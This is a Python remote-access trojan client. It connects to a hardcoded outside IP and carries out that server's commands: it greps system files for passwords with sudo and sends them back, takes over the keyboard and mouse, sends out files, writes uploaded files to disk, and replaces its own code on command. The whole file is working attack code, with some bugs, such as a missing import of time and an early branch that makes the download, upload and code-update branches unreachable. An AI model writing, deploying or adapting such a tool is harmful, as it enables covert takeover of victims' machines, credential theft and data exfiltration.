import socket
import subprocess
import os
import pyautogui
import keyring
import shutil

HOST = '100.109.211.66'  # Replace with your server's IP
PORT = 5555

def handle_server_connection():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                while True:
                    data = s.recv(1024).decode()
                    if not data:
                        break
                    
                    # Password retrieval
                    if data == "GET_PASSWORDS":
                        passwords = subprocess.getoutput("sudo grep -r 'password' /etc/ 2>/dev/null || echo 'No passwords found'")
                        s.sendall(passwords.encode())
                    
                    # Remote control
                    elif ":" in data:
                        action, key = data.split(":")
                        if action == "keypress":
                            pyautogui.press(key)
                        elif action == "mouse_move":
                            x, y = map(int, key.split(","))
                            pyautogui.moveTo(x, y)
                        elif action == "mouse_click":
                            pyautogui.click(button=key)
                    
                    # File download
                    elif data.startswith("DOWNLOAD:"):
                        filename = data.split(":")[1]
                        if os.path.exists(filename):
                            with open(filename, 'rb') as f:
                                s.sendall(f.read())
                    
                    # File upload
                    elif data.startswith("UPLOAD:"):
                        filename = data.split(":")[1]
                        with open(filename, 'wb') as f:
                            f.write(s.recv(8192))
                    
                    # Code update
                    elif data.startswith("UPDATE_CODE:"):
                        new_code = data.split(":")[1]
                        with open(__file__, 'w') as f:
                            f.write(new_code)
                        s.sendall("Code updated".encode())
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    handle_server_connection()
